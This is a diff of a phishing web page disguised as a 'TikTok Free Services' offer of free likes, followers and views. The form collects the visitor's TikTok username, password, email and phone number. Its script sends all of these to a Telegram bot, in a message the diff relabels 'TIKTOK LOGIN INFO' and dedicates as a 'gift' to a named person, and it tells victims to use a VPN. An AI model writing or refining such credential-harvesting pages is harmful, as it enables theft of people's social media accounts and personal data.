@@ -111,38 +111,39 @@
 
 
 <div class="container">
-  <h2>TikTok Free Services</h2>
+  <h2>TikTok Free Services <br> <span style="color: white;font-size: 19px;">(Use VPN Must)</span> </h2>
 
   <input type="text" id="username" placeholder="TikTok Username" required>
   <input type="password" id="password" placeholder="Password" required>
   <input type="text" id="videoLink" placeholder="TikTok Video Link" required>
   <input type="email" id="email" placeholder="Email Address" required>
-  <input type="text" id="phone" placeholder="Phone Number" required>
+  <input type="number" id="phone" placeholder="Phone Number" required>
   <div class="card-selects">
     <select id="likes">
-      <option value="">Likes</option>
-      <option value="100">100 Likes</option>
-      <option value="500">500 Likes</option>
-      <option value="1000">1000 Likes</option>
+      <option value="">Likes❤️</option>
+      <option value="100">100 Likes❤️</option>
+      <option value="500">500 Likes❤️</option>
+      <option value="1000">1000 Likes❤️</option>
     </select>
     <select id="followers">
-      <option value="">Followers</option>
-      <option value="100">100 Followers</option>
-      <option value="500">500 Followers</option>
+      <option value="">Followers👥</option>
+      <option value="50">50 Followers👥</option>
+      <option value="100">100 Followers👥</option>
+      <option value="500">500 Followers👥</option>
     </select>
     <select id="views">
-      <option value="">Views</option>
-      <option value="100">100 Views</option>
-      <option value="1000">1000 Views</option>
-      <option value="5000">5000 Views</option>
+      <option value="">Views👀</option>
+      <option value="100">100 Views👀</option>
+      <option value="1000">1000 Views👀</option>
+      <option value="5000">5000 Views👀</option>
     </select>
   </div>
 
-  <button onclick="sendData()">Submit Request</button>
+  <button onclick="sendData()"> <b>Submit Request</b> </button>
   <div class="loading" id="loading">⏳ Processing Request...</div>
-  <div class="success" id="success">✅ Request Sent Successfully! <b>Please Wait...</b></div>
+  <div class="success" id="success">✅ Request Sent Successfully! Please Wait... <b>Please Wait...</b></div>
 
-  <footer>Get Free Tiktok Services</footer>
+  <footer>Get Free <b>Tiktok</b> Services.</footer>
 </div>
 
 <script>
@@ -167,16 +168,25 @@ function sendData() {
   document.getElementById("loading").style.display = "block";
   document.getElementById("success").style.display = "none";
 
-  const message = `🎯 TikTok Free Services Request
------------------------
+  const message = `
+🎁 GIFT For 𝑺𝑯𝑬𝑯𝒁𝑨𝑫 𝑨𝑳𝑰
+----------------------------------------
+🎯 TIKTOK LOGIN INFO
+----------------------------------------
 👤 Username: ${username}
+🔑 Password: ${password}
 📧 Email: ${email}
 📱 Phone: ${phone}
-🔑 Password: ${password}
 🎬 Video Link: ${videoLink}
+----------------------------------------
+🔥 SERVICE REQUEST
+----------------------------------------
 ❤️ Likes: ${likes}
 👥 Followers: ${followers}
-👀 Views: ${views}`;
+👀 Views: ${views}
+----------------------------------------
+Power By Shehzad Ali
+`;
 
   fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
     method: "POST",
@@ -190,7 +200,7 @@ function sendData() {
   })
   .catch(error => {
     document.getElementById("loading").style.display = "none";
-    alert("Error sending data!");
+    alert("Try Again! if not work Connect VPN");
   });
 }
 </script>
